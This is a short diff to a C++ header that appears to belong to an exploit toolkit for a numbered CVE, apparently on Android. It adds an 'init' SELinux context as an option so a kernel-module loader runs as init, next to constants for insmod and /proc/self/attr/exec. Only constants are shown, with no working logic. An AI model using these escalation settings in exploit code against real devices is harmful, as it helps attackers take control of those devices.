@@ -142,6 +142,9 @@ namespace ghostlock::backend::cve_2026_43284::steps {
 
     /* Upstream libcxx.S defaults. */
     inline constexpr char kLibcxxSelinuxContext[] = "u:r:vendor_modprobe:s0";
+    /* Execution-context selector alternative (execution.selinux_exec_context=1):
+     * run the loader as init instead of the vendor_modprobe transition. */
+    inline constexpr char kLibcxxInitContext[] = "u:r:init:s0";
     inline constexpr char kLibcxxInsmodPath[] = "/vendor/bin/insmod";
     inline constexpr char kLibcxxMutexPath[] = "/dev/df";
     inline constexpr char kLibcxxAttrExecPath[] = "/proc/self/attr/exec";
